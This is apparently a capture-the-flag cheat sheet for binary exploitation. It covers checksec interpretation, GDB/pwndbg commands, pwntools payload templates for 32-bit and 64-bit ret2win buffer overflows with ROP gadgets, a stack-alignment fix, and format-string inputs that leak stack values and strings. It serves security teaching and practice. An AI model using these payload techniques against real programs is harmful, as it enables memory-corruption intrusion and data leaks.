# Pwn Cheatsheet & Rapid Guide

## 1. Initial Assessment
```bash
file ./vuln
checksec --file=./vuln
```
| Security Check | Meaning | Impact on Exploit |
| :--- | :--- | :--- |
| **RELRO: Full** | Global Offset Table is read-only | Cannot overwrite GOT functions. |
| **Stack Canary: No** | No stack smash protection | Easy buffer overflow! |
| **NX: Disabled** | Stack/heap is executable | You can inject and run direct shellcode on the stack! |
| **PIE: Disabled** | Fixed binary memory addresses | Static function/gadget addresses in binary (e.g. `0x401156`). |

---

## 2. GDB (Pwndbg / GEF) Quick Reference
```bash
gdb ./vuln
# Inside GDB:
checksec
info functions              # List all functions (look for win, secret, flag, backdoor)
disas main                  # Disassemble main
disas win                   # Disassemble win function
b *main+40                  # Set breakpoint
r                           # Run
c                           # Continue
x/20gx $rsp                 # Examine 20 64-bit hex words on stack
cyclic 100                  # Generate cyclic pattern
cyclic -l <crash_value>     # Find exact buffer overflow offset
```

---

## 3. Ret2Win (32-bit vs 64-bit)

### 32-bit: Arguments are on the Stack
```python
# Payload structure:
# [Padding to EIP] + [win_addr] + [dummy_return_addr] + [arg1] + [arg2]
payload = b"A" * offset + p32(win_addr) + p32(0x0) + p32(0xdeadbeef)
```

### 64-bit: Arguments are in Registers (RDI, RSI, RDX...)
```python
# Calling convention: 1st arg -> RDI, 2nd arg -> RSI, 3rd arg -> RDX
# Payload structure:
# [Padding to RIP] + [ret (alignment)] + [pop rdi; ret] + [arg1] + [win_addr]
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload = b"A" * offset + p64(ret) + p64(pop_rdi) + p64(0xdeadbeef) + p64(win_addr)
```

> **CRITICAL TIP (MOVAPS Issue)**: If your 64-bit exploit crashes inside `system()` or `do_system` at an instruction like `movaps XMMWORD PTR [rsp+0x40], xmm0`, it means your stack is NOT 16-byte aligned. Prepend a single `ret` gadget before your payload to fix alignment!

---

## 4. Format String Vulnerabilities (`printf(user_input)`)

### Leak Stack Values (Addresses / Canaries)
```bash
# Input test:
%p %p %p %p %p %p %p %p %p %p
# Or directly access 6th argument:
%6$p
```

### Direct String Leak
If a pointer to the flag is stored on the stack:
```bash
%7$s    # Reads string from pointer located at argument 7
```
